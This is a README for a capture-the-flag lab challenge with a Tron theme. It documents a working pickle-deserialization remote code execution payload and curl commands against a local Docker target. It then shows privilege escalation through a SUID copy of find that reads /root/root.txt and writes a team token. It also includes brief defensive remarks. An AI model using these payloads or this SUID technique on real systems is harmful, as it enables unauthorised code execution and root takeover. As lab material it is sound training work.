# Hill 10 - MCP Core (Tron) (pickle deserialization RCE -> SUID find)

*Theme: Tron / the Master Control Program.* The MCP "restores" a serialized session
object you present, calling `pickle.loads` on attacker-controlled bytes.

- **Entry:** `GET /console?data=<base64>` base64-decodes and unpickles your session ->
  **insecure deserialization RCE**. A crafted object whose `__reduce__` returns a call to
  `subprocess.getoutput` runs a command and the output comes back in the response.
  Foothold: `mcp`. Port 80 (8090 locally).
- **Privesc:** `/usr/local/bin/mcp_ctl` is a **SUID-root copy of `find`** (GTFOBins):
  `mcp_ctl /etc/hostname -exec cat /root/root.txt \;`. Restored on reset.
- **Flags:** `user.txt` (foothold) and `/root/root.txt` (root).

## Attack chain

    # 1. build a pickle whose __reduce__ runs a command and returns its output
    payload() { python3 -c '
    import pickle,base64,subprocess,sys
    class E:
        def __reduce__(self): return (subprocess.getoutput,(sys.argv[1],))
    print(base64.b64encode(pickle.dumps(E())).decode())' "$1"; }

    # 2. foothold -> user flag
    curl -s -G http://127.0.0.1:8090/console --data-urlencode "data=$(payload 'cat /home/mcp/user.txt')"

    # 3. privesc via SUID find -> root flag
    curl -s -G http://127.0.0.1:8090/console --data-urlencode \
      "data=$(payload '/usr/local/bin/mcp_ctl /etc/hostname -exec cat /root/root.txt \;')"

    # 4. take the hill: write your team token to /root/king.txt (as root via SUID find).
    # NB: a SUID binary that execs a shell drops euid, so use find's own -fprintf to write
    # the file directly (no subshell) rather than -exec sh -c "echo ... > king.txt".
    curl -s -G http://127.0.0.1:8090/console --data-urlencode \
      "data=$(payload '/usr/local/bin/mcp_ctl /etc/hostname -fprintf /root/king.txt TOK-YOUR-TEAM')"

## Run locally

    docker compose up -d --build   # app: http://localhost:8090/

## Reset behaviour

`reset.sh` re-applies the SUID bit on `mcp_ctl` and keeps the server alive. It does **not**
touch `king.txt`. Defence: drop the SUID copy (or set `no-new-privileges`) and kick rivals;
a scheduled reset restores the intended escalation path.
